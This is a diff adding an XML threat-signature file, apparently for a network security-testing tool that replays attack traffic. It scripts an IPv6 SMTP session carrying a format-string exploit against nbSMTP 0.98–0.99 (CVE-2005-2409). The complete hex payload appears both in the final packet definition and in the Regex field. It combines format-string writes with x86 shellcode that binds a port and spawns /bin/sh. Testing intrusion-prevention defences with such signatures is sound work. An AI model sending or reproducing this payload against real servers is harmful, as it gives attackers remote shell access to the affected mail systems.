@@ -1,0 +1,139 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="nbSMTP Format String Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a malicious message from one SMTP server to another.  This malicious message is a format string attack that attacks the logging functionality of the no-brainer SMTP server.  This threat is a client attack that comes from the virtual server.  SMTP typically listens on port 25. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="SMTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="nbSMTP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="nbSMTP_nbSMTP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="nbSMTP_nbSMTP_0.98"/>
+      <item value="nbSMTP_nbSMTP_0.99"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/advisories/8997"/>
+    <CVEID display="true" value="CVE-2005-2409"/>
+    <bugtraqID display="true" value="14441"/>
+    <OSVDB display="true" value="18478"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="c9b87777fb9be23e7c604efcfb32937e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211991892"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="K"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X35\X35\X33\X20\X78\X78\X08\X04\XD4\XD4\X08\X04\XD4\XD6\X90\X90\X90\X90\X6A\X66\X58\X6A\X01\X5B\X99\X52\X53\X6A\X02\X89\XE1\XCD\X80\X52\X43\X68\XFF\X02\X13\XD2\X89\XE1\X6A\X10\X51\X50\X89\XE1\X89\XC6\XB0\X66\XCD\X80\X43\X43\XB0\X66\XCD\X80\X52\X56\X89\XE1\X43\XB0\X66\XCD\X80\X89\XD9\X89\XC3\XB0\X3F\X49\XCD\X80\X41\XE2\XF8\X52\X68\X6E\X2F\X73\X68\X68\X2F\X2F\X62\X69\X89\XE3\X52\X53\X89\XE1\XB0\X0B\XCD\X80\X25\X31\X32\X36\X32\X37\X75\X25\X37\X24\X6E\X25\X35\X34\X38\X35\X30\X75\X25\X38\X24\X6E\X0A"/>
+    <Created value="1139462303" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="M"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="N"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="O"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="P"/>
+    <NamedVar name="SMTPdestPort" type="ImperfectControls.Port" value="null" index="Q"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="D"/>
+    <for index="F"/>
+    <for index="H">
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="T">
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="K"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="HELO" Parameter="server" Payload=""/>
+        </TCP>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="MAIL FROM:" Parameter="example@example.com" Payload=""/>
+        </TCP>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="T" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <SMTP Command="RCPT TO:" Parameter="test@example.com" Payload=""/>
+        </TCP>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2,5">
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3232300A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3235300A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="K" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3535332078780804D4D40804D4D6909090906A66586A015B9952536A0289E1CD80524368FF0213D289E16A10515089E189C6B066CD804343B066CD80525689E143B066CD8089D989C3B03F49CD8041E2F852686E2F7368682F2F626989E3525389E1B00BCD80253132363237752537246E253534383530752538246E0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
